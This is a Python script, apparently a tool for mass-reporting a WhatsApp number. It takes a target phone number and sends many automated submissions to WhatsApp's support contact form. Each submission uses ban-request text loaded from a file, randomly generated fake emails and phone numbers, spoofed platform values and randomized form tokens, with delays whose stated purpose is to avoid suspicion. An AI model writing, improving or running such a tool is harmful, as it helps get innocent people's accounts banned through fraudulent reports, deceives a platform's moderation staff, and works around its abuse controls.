import requests
import time
import random
import json
import re
import string
from colorama import Fore, Style, init
init(autoreset=True)
import os
print(f"Created by **>>BayLak<<** 2025/01/22")
# Function to validate phone number with country code
def is_valid_country_code(phone_number):
    # Ensure the number starts with "+" followed by digits only
    # Validate that the number contains a country code followed by 10 to 12 digits
    pattern = r"^\+\d{1,4}\d{10,12}$"  # Modified to allow 10 to 12 digits
    return re.match(pattern, phone_number) is not None

# Request the phone number from the user with validation to ensure it starts with "+" and followed by digits only
while True:
    user_input = input(Fore.CYAN + "Enter the phone number with country code (e.g. +20123456789): ")
    
    # Validate using the regular expression
    if is_valid_country_code(user_input):
        replacement_number = user_input
        print(f"The entered number is valid: {replacement_number}")

        # Option to choose Correct or Incorrect
        choice = input("Do you want to?? (ban/unban): ").strip().lower()
        
        if choice == "ban":
            with open('message_ban_whatsapp.json', 'r', encoding='utf-8') as file:
                ban = json.load(file)
            print("The number has been confirmed successfully.")
            break
        elif choice == "unban":
            with open('message_unban_whatsapp.json', 'r', encoding='utf-8') as file:
                ban = json.load(file)
            print("The number has been confirmed successfully.")
            break
        else:
            print("Invalid choice, please choose 'ban' or 'unban'.")
    else:
        print(f"{Fore.RED}Please enter a valid number with a country code, like: +20123456789")
def get_request_count():
    while True:
        try:
            num_requests = int(input(Fore.CYAN + "Enter the number of requests to send: "))
            if num_requests > 0:
                return num_requests
            else:
                print(Fore.RED + "Please enter a number greater than 0.")
        except ValueError:
            print(Fore.RED + "Please enter a valid number.")

# Request the number of requests to send
num_requests = get_request_count()        
# Target URL
url = "https://www.whatsapp.com/contact/noclient/async/new/"

# Request headers
headers = {
    "Host": "www.whatsapp.com",
    "Cookie": "wa_lang_pref=ar; wa_ul=f01bc326-4a06-4e08-82d9-00b74ae8e830; wa_csrf=HVi-YVV_BloLmh-WHL8Ufz",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "X-Asbd-Id": "129477",
    "X-Fb-Lsd": "AVpbkNjZYpw",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Origin": "https://www.whatsapp.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.whatsapp.com/contact/noclient?",
    "Accept-Encoding": "gzip, deflate, br"
}

# Data template to send in the request
data = {
    "country_selector": "",  # Will be filled dynamically
    "email": "",  # Will be filled dynamically
    "email_confirm": "",  # Will be filled dynamically
    "phone_number": "",  # Will be filled dynamically
    "platform": "",
    "your_message": "",
    "step": "articles",
    "__user": "0",
    "__a": "",
    "__req": "",
    "__hs": "20110.BP%3Awhatsapp_www_pkg.2.0.0.0.0",
    "dpr": "1",
    "__ccg": "UNKNOWN",
    "__rev": "",
    "__s": "ugvlz3%3A6skj2s%3A4yux6k",
    "__hsi": "",
    "__dyn": "7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa1twYwJw4BwUx60Vo1upE4W0OE3nwaq0yE1VohwnU14E9k2C0iK0D82Ixe0EUjwdq1iwmE2ewnE2Lw5XwSyES0gq0Lo6-1Fw4mwr81UU7u1rwGwbu",
    "__csr": "",
    "lsd": "AVpbkNjZYpw",
    "jazoest": ""
}

# Function to generate random email
def generate_random_email():
    length = 10  # Length of the random name part
    random_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{random_name}@gmail.com"

# Function to generate random phone number based on country selector
def generate_random_phone(country_selector):
    if country_selector == "EG":  # مصر
        # في مصر عادة الأرقام تبدأ بـ +20 تليها 10 أرقام بحيث تبدأ أول 2 رقم بعد +20 عادة بـ 1، 2 أو 3.
        return f"+20{random.choice([1, 2, 3])}{random.randint(100000000, 999999999)}"  
    elif country_selector == "US":  # أمريكا
        return f"+1{random.randint(1000000000, 9999999999)}"  # الولايات المتحدة الأمريكية
    elif country_selector == "KR":  # كوريا الجنوبية
        return f"+82{random.randint(100000000, 999999999)}"  # كوريا الجنوبية
    elif country_selector == "CN":  # الصين
        return f"+86{random.randint(100000000, 999999999)}"  # الصين
    elif country_selector == "IN":  # الهند
        return f"+91{random.randint(1000000000, 9999999999)}"  # الهند
    return "0123456789"  # رقم هاتف افتراضي

# Function to save the response to a log file
def save_response_to_log(response_text):
    with open("logs.txt", "a") as log_file:
        log_file.write(response_text + "\n")

# Function to send requests and display results with delay
def send_requests(num_requests, delay):
    # Open the file and read the lines
    with open("phones.db", "r") as file:
        phone = file.readlines()
    with open("ips.db", "r") as file:
        ip = file.readlines()

    countries = ["EG", "US", "KR", "CN", "IN"]  # List of countries to choose from
    # Replace [###] with the phone number in each message
    for item in ban:
        item['message'] = item['message'].replace("[###]", replacement_number)

    for i in range(num_requests):
        try:
            # Select a random line from the list
            random_name_phones = random.choice(phone).strip()
            random_ip = random.choice(ip).strip()
            random_item = random.choice(ban)
            # Randomly choose a country from the list
            country_selector = random.choice(countries)
            platforms = ["ANDROID", "IPHONE", "WHATS_APP_WEB_DESKTOP", "KAIOS", "OTHER"]
            jazoest = f"20000{random.randint(10000, 99999)}"
            __hsi = random.randint(1000000000000000000, 9999999999999999999)
            __req = round(random.uniform(0.1, 10), 6)
            __a = random.randint(1, 1000000000)
            __rev = random.randint(1000000000, 9999999999)
            # Update data dictionary with dynamic values
            data["country_selector"] = country_selector
            data["email"] = generate_random_email()
            data["email_confirm"] = data["email"]  # Ensure email_confirm is the same as email
            data["phone_number"] = generate_random_phone(country_selector)  # Generate phone number based on country
            data["your_message"] = random_item['subject'] + "%A0" + random_item['message']
            data["platform"] = random.choice(platforms)
            data["jazoest"] = jazoest
            data["__hsi"] = __hsi
            data["__req"] = __req
            data["__a"] = __a
            data["__rev"] = __rev

            # Send POST request
            response = requests.post(url, headers=headers, data=data)

            # Check if request was successful (status code 200)
            if response.status_code == 200:
                print(f"{Fore.RED}request:{Fore.GREEN}({i+1}) {Fore.RED}device?:{Fore.GREEN}{random_name_phones} {Fore.RED}IP:{Fore.GREEN}{random_ip} {Fore.BLUE}-> {Fore.WHITE}Email:{data['email']} | Phone:{country_selector} {data['phone_number']} | Attck -> {replacement_number}")
                save_response_to_log(response.text)  # Save the response to logs.txt
            else:
                print(Fore.RED + f"{random_ip} {i+1} - Request failed with status code: {response.status_code}")
            
            # Delay between requests to avoid suspicion
            time.sleep(delay)
        except requests.exceptions.RequestException as e:
            print(f"{random_name_phones} {i+1} - An error occurred: {e}")

# Send 5 requests with a 10-second delay between each request
send_requests(num_requests, 10)

